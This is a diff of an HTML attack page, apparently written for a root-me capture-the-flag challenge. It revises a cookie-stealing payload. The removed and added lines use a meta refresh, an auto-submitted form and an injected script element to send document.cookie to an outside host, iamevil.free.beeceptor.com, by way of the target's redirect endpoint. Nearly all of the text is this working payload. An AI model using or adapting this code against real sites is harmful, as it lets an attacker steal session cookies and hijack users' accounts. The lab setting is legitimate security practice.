@@ -2,18 +2,20 @@
 <html>
 <head>
     <title>CSRF Attack</title>
+    <!-- Meta redirect might behave differently than JavaScript redirects -->
+    <meta http-equiv="refresh" content="1;url=http://127.0.0.1:58039/redirect?url=https://iamevil.free.beeceptor.com/meta?cookie=<%=document.cookie%>">
 </head>
-<body onload="document.forms[0].submit()">
-    <!-- Try to make a request that includes the flag as a parameter -->
-    <form action="http://127.0.0.1:58039/redirect" method="GET">
-        <input type="hidden" name="url" value="https://iamevil.free.beeceptor.com/flag?cookie=<%=document.cookie%>">
-    </form>
-    
-    <!-- Fallback script -->
+<body>
     <script>
+        // Try to create a dynamic script element that might have different behavior
+        var script = document.createElement('script');
+        script.src = 'https://iamevil.free.beeceptor.com/script_leak?cookie=' + encodeURIComponent(document.cookie);
+        document.body.appendChild(script);
+        
+        // Fallback
         setTimeout(function() {
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/form_timeout';
-        }, 2000);
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/script_timeout';
+        }, 1500);
     </script>
 </body>
 </html>
